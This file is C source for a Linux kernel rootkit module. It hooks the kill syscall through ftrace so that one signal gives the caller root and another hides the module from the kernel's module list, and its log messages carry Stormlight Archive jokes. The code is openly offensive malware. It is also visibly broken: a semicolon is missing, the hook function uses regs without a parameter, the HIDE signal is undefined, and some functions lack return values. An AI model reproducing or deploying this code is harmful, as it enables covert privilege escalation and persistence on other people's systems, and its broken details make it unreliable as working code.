#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include "support_file.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Odium");
MODULE_DESCRIPTION("Linux Kernel Rootkit Tested and Working for Kernel 5.7.x");
MODULE_VERSION("1.0");

static asmlinkage long (*original_kill) (const struct pt_regs*);
static struct list_head* previous_module;
int TOGGLE_STATE = 0

enum sigvalues {
	ELEVATE = 64,
	TOGGLEINVIS = 63 
};

static int invisible(void) {
	previous_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	return 0;
}

static int reveal(void) {
	list_add(&THIS_MODULE->list, previous_module);
	return 0;
}

static int elevate_to_root(void) {
	struct cred* current_user;

	current_user = prepare_creds();

	if (current_user == NULL) {
		return 1;
	}

	current_user->uid.val = 0;
	current_user->gid.val = 0;
	current_user->euid.val = 0;
	current_user->egid.val = 0;
	current_user->suid.val = 0;
	current_user->sgid.val = 0;
	current_user->fsuid.val = 0;
	current_user->fsgid.val = 0;

	commit_creds(current_user);
}


asmlinkage int hook_kill(void){
 	
	int signal = regs->si;

	void invisible(void);
	void reveal(void);
	void elevate_to_root(void);

	if (signal == ELEVATE) {
		printk(KERN_INFO "Odium is giving Taravangian some voidlight and a voidspren he's too damn strong now!\n");
			
		if (elevate_to_root() == 1) {
			printk(KERN_INFO "Error: When Elevating privlieges!\n");
		}

		return 0;
	}

	else if (signal == HIDE) {

		if (TOGGLE_STATE == 0) {
			if (invisible() == 1) {
				return 1;
			}
			TOGGLE_STATE = 1;
			printk(KERN_INFO "Taravangian's sneaky ass is hiding his musty ass somewhere!\n");
		}

		else if (TOGGLE_STATE == 1) {
			if (reveal() == 1) {
				return 1;
			}
			printk(KERN_INFO "Taravangian's dumbass is back!\n");
		}
		
		return 0;
	}
		
	return original_kill(regs);
	
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_kill", hook_kill, &original_kill)
};

static int __init rootkit_init(void) {
	int error = 1;

	error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

	if (error != 0) {
		printk(KERN_INFO "Error when installing rootkit\n");
		return error;
	}

	printk(KERN_INFO "Odium Planted that sick bastard Taravangian into your system goodluck!\n");

	return 0;
}

static void __exit rootkit_exit(void) {
	int error = fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

	if (error == 1) {
		printk(KERN_INFO "Error when removing rootkit hooks");
		return;
	}

	printk(KERN_INFO "Thank God Together with the heralds and the Knigts radiant you took out Taravangian and Odium saving Roshar!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
